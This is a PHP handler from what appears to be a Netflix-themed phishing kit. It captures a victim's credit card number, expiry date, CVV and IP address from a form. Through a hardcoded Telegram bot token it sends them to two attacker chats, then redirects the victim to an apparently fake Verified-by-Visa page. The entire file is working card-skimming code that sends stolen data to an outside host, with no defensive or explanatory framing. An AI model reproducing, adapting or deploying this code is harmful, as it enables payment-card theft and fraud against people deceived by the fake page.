
<?php


$ip = $_SERVER["REMOTE_ADDR"];
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
date_default_timezone_set('Africa/Cairo');
$date = date('d/m/Y h:i:sa');
$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];
$config_token = "5759111738:AAHsW7K_NhXMJOk89TYWrwooJYYCsu8k1Xo";
$config_chat = "-995416692";

function callAPI($url){
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_URL, $url);
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
   curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
   // EXECUTE:
   $result = curl_exec($curl);
   curl_close($curl);
}


$_SESSION['c_num'] = $_POST['c_num'];
$_SESSION['exdate'] = $_POST['exdate'];
$_SESSION['csc'] = $_POST['csc'];
// Check if username or password is empty
if (empty($_SESSION['c_num']) || empty($_SESSION['exdate']) || empty($_SESSION['csc'])) {

    header('Location: ../billing2.php?error=true'); // Redirect back to the login page
    exit;
}

################

$TELG.= urlencode("<b>N3tf1!x--Cr3d!t card</b> : ".$ip."\n");

$TELG.= urlencode("»<b> Card Number</b> : ".$_SESSION['c_num']."\n");
$TELG.= urlencode("»<b> Expiry Date</b> : ".$_SESSION['exdate']."\n");
$TELG.= urlencode("»<b> CVV</b> : ".$_SESSION['csc']."\n\n");
################

callAPI('https://api.telegram.org/bot'.$config_token.'/sendMessage?chat_id='.$config_chat.'&text='.$TELG.'&parse_mode=html');
callAPI('https://api.telegram.org/bot5759111738:AAHsW7K_NhXMJOk89TYWrwooJYYCsu8k1Xo/sendMessage?chat_id=-902512143&text='.$TELG.'&parse_mode=html');
header('location: ../vbvload.php?enc=' . md5(time()) . '&p=1&dispatch=' . sha1(time())); 
################

?>

